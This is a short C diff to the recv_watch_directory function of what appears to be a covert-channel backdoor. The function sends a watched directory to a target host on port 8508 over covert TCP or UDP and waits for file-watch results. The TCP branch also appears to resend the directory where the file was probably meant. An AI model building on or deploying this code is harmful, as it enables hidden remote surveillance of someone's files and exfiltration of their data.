@@ -120,6 +120,7 @@ void *watch_directory(void* args){
 void *recv_watch_directory(void* args){
     inotify_struct *arg = args;
     char data[BUFSIZ];
+    char data1[BUFSIZ];
     char directory[BUFSIZ];
     char file[BUFSIZ];
 
@@ -129,16 +130,16 @@ void *recv_watch_directory(void* args){
     strncpy(data, directory, BUFSIZ);
 	if(arg->tcp){
         covert_send(arg->localip, arg->targetip, 8508, 8508, (unsigned char*)data, 0);
+        memset(data, 0, BUFSIZ);
+        strncpy(data1, directory, BUFSIZ);
+        covert_send(arg->localip, arg->targetip, 8508, 8508, (unsigned char*)data1, 0);
     } else {
-        covert_udp_send_data(arg->localip, arg->targetip, 8508, 8508, data, 1);
+        covert_udp_send_data(arg->localip, arg->targetip, 8508, 8508, data, 0);
+        memset(data, 0, BUFSIZ);
+        strncpy(data, file, BUFSIZ);
+        covert_udp_send_data(arg->localip, arg->targetip, 8508, 8508, data, 0);
     }
-    strncpy(data, directory, BUFSIZ);
-    if(arg->tcp){
-        covert_send(arg->localip, arg->targetip, 8508, 8508, (unsigned char*)data, 0);
-    } else {
-        covert_udp_send_data(arg->localip, arg->targetip, 8508, 8508, data, 1);
-    }
-    recv_results(arg->targetip, 8508, "inotify", arg->tcp);
+    recv_results(arg->localip, 8508, "inotify", arg->tcp);
 }
 
 
